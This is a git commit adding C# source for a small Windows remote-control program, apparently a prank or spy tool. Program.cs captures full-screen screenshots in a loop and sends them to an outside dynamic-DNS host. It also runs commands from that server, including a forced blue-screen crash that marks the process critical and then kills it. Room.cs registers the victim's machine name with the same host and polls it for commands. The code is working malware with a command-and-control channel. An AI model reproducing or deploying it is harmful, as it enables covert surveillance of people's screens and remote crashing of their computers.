31f9ec0620bfc4ec60608c800e8a52738f02fe5b
Leeeeeeeeeeeeeeeeeeeee <dimarodin0@gmail.com>
2020-11-04 21:57:23 +0400

    Добавьте файлы проекта.

---
+++ Nviemy1.24.2/Program.cs
@@ -0,0 +1,100 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Net;
+
+using System.Drawing;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Threading.Tasks;
+using Newtonsoft.Json;
+using System.Windows.Forms;
+using API;
+using System.Diagnostics;
+
+namespace GloryHole
+{
+    class Program
+    {
+
+        ///Импортирование user32.dll для скриншотов
+        [DllImport("user32.dll")]
+        public static extern void keybd_event(byte vk, byte scan, int flags, int extrainfo);
+        ///Импортирование ntdll.dll для BSOD
+        [DllImport("ntdll.dll")]
+        private static extern int NtSetInformationProcess(IntPtr process, int process_class, ref int process_value, int length);
+
+
+        static async Task Main(string[] args)
+        {
+            Room room = new Room(Environment.MachineName);
+
+            while (true)
+            {
+                if (room.isOnline)
+                    try
+                    {
+                        await room.sendScreen(getScreenShot());
+                        foreach (Command cmd in room.commands)
+                        {
+                            switch (cmd.type)
+                            {
+                                case (CommandTypes.AntiVanya): /*Ели косанда анти ваня */
+                                    break;
+                                case (CommandTypes.Cursor): /*Ели курсор поменять нада */
+                                    break;
+                                case (CommandTypes.SwapScreen):/*Ели нада экран перевернуть */
+                                    break;
+                                case (CommandTypes.WriteText):/*Ели текс нада написать */
+                                    break;
+                                case (CommandTypes.BSOD):/*Бдос вызвать нада */
+                                    BSOD();
+                                    break;
+                            }
+                        }
+                    }
+                    catch(Exception e) 
+                    {
+                        #if DEBUG
+                            Console.WriteLine(e.Message);
+                        #endif
+                    }
+                Thread.Sleep(500);
+            }
+        }
+
+
+        public static void PressKeyToKill(object comand)
+        {
+
+        }
+
+
+        /// <summary>
+        /// Синий экран смерти
+        /// </summary>
+        public static void BSOD()
+        {
+            Process.EnterDebugMode();
+            int status = 1;
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
+            Process.GetCurrentProcess().Kill();
+        }
+
+
+
+        static string getScreenShot()
+        {
+            string id = Environment.MachineName;
+            var ms = new MemoryStream();
+            Graphics graph = null;
+            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            graph = Graphics.FromImage(bmp);
+            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+            bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+            string base64 = Convert.ToBase64String(ms.GetBuffer());//это комментарий
+            Console.WriteLine(id);
+            return (base64);
+        }
+    }
+}
---
+++ Nviemy1.24.2/Room.cs
@@ -0,0 +1,108 @@
+﻿using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Net.Http;
+using System.Text;
+using System.Threading.Tasks;
+
+
+namespace API
+{
+    public class Room
+    {
+        string computername;
+        public List<Command> commands = new List<Command> { };
+
+        /// <summary>
+        /// Возвращает онлайн ли комната
+        /// </summary>
+        public bool isOnline
+        {
+            get
+            {
+                WebClient webClient = new WebClient();
+                webClient.QueryString.Add("computername", computername);
+                string result = webClient.DownloadString("http://wrongdoor.ddns.net/rooms/isOnline.php");
+                Console.WriteLine(result);
+                Status status = JsonConvert.DeserializeObject<Status>(result);
+                commands = (status.commands != null) ? status.commands : new List<Command> { }; ;
+                return (status.isOnline);
+            }
+        }
+
+        public Room(string computername)
+        {
+            this.computername = computername;
+            init(computername);
+        }
+
+
+        /// <summary>
+        /// Отсылает скриншот на сервер
+        /// </summary>
+        /// <param name="screenshot"></param>
+        /// <returns></returns>
+        public async Task sendScreen(string screenshot)
+        {
+            HttpClient client = new HttpClient();
+            FormUrlEncodedContent content = new FormUrlEncodedContent(
+                    new Dictionary<string, string>
+                        {
+                            { "screenshot", screenshot },
+                            { "computername", computername },
+                        }
+                );
+            await client.PostAsync("http://wrongdoor.ddns.net/rooms/sendScreen.php", content);
+        }
+
+
+
+        /// <summary>
+        /// Создаёт новую комнату
+        /// </summary>
+        /// <param name="computername">имя компутера</param>
+        private static void init(string computername)
+        {
+            WebClient webClient = new WebClient();
+            webClient.QueryString.Add("computername", computername);
+            string result = webClient.DownloadString("http://wrongdoor.ddns.net/rooms/init.php");
+        }
+    }
+
+
+    /// <summary>
+    /// return from server
+    /// </summary>
+    class Status
+    {
+        public List<Command> commands;
+        public bool isOnline;
+    }
+
+
+    /// <summary>
+    /// Команда, НЕ БЕРИ ПЕРЕМЕННЫЕ, ели ты не уверен, что они присутсвуют в статусе
+    /// </summary>
+    public interface Command
+    {
+        CommandTypes type { get; }
+        int x { get; }
+        int y { get; }
+        string text { get; }
+    }
+
+    /// <summary>
+    /// Типы команд(если хочешь добавить свою, то тебе нада обговаривать со мной) 
+    /// </summary>
+    public enum CommandTypes
+    {
+        AntiVanya = 0,
+        Cursor = 1,
+        SwapScreen = 2,
+        WriteText = 3,
+        BSOD = 4,
+    }
+}
+
